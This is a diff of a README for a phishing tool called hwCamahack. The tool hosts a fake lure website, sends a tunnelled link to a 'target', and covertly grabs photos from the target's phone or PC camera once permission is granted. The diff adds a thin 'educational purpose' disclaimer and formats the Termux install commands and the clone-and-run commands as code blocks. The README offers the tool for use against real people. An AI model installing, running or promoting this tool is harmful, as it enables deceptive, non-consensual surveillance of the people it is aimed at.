@@ -1,6 +1,9 @@
 # HwCamahack
 
-Grab cam shots from target's phone front camera or PC webcam just sending a link. 
+Grab cam shots from target's phone front camera or PC webcam just sending a link.
+
+## DEVLOPER BY HEXCA WEB 
+assalamualaikum everyone this is educational purpose 
 
 ### What is hwCamahack?
 hwCamahack is a technique to take cam shots of a target's phone front camera or PC webcam. hwCamahack hosts a fake website on an in-built PHP server and uses tunneling services to generate a link which we will forward to the target, which can be used over the internet. The website asks for camera permission and if the target allows it, this tool grabs camshots of the target's device.
@@ -25,30 +28,34 @@ Simply enter the festival name or YouTube's video ID.
 
 First, run the following commands step-by-step on your Termux terminal to install the required dependencies:
 
-`termux-setup-storage`
-`pkg update -y && pkg upgrade -y`
-`apt update && apt upgrade -y`
-`pkg install wget curl -y`
-`pkg install python -y`
-`pkg install openssh -y`
-`pkg install php -y`
-`pkg install git -y`
-`pkg install cloudflared -y`
-`pip install flask`
-`python -m pip install flask`
-`pip install colorama`
-`python -m pip install colorama`
+```bash
+termux-setup-storage
+pkg update -y && pkg upgrade -y
+apt update && apt upgrade -y
+pkg install wget curl -y
+pkg install python -y
+pkg install openssh -y
+pkg install php -y
+pkg install git -y
+pkg install cloudflared -y
+pip install flask
+python -m pip install flask
+pip install colorama
+python -m pip install colorama
+```
 
 ### Step 2: Clone and Run
 
 After installing the packages, clone the repository and start the tool:
 
-`git clone https://github.com/Hackerscolonyofficial/HCO-Cam-Tam.git`
-`ls`
-`cd HCO-Cam-Tam`
-`ls`
-`chmod +x *`
-`python main.py`
+```bash
+git clone [https://github.com/Hackerscolonyofficial/HCO-Cam-Tam.git]
+ls
+cd HCO-Cam-Tam
+ls
+chmod +x *
+python main.py
+```
 
 ---
 
